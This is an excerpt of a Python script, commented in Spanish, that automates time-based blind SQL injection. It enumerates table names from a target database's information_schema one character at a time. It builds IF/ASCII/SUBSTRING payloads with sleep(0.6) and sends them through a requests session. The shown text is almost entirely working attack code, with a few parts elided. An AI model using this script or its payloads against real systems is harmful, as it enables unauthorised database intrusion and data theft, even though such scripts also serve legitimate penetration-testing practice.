...
def arguments():
    ...
    parse.add_argument('-d', dest='database', default='shop', type=str, help='Name of database to extract its tables')
...
# Convertimos la db en hexadecimal para implementarla en nuestra query
db_name = args.database.encode('utf-8').hex()  

session = requests.Session()

print("[+] Extrayendo las tablas de la base de datos '%s'" % (args.database))
p1 = log.progress("Payload")
print()

# Simulamos que existen 10 tablas
for row in range(0,10):
    if terminate: break  # Evitamos que imprima los demás "Table" y "Payload"
    p2 = log.progress("Table [%s]" % (row))
    result = ""
    # Simulamos que cada tabla tiene 50 caracteres en su nombre
    for row_position in range(1,50):
        for letter in dic_letters:
            if terminate: break
            
            payload = "1 or IF(Ascii(substring((SELECT table_name FROM information_schema.tables"
            payload += " WHERE table_schema IN (0x%s) LIMIT %d,1),%d,1))=%d,sleep(0.6),1)#" % (db_name, row, row_position, ord(letter))
            p1.status(payload)
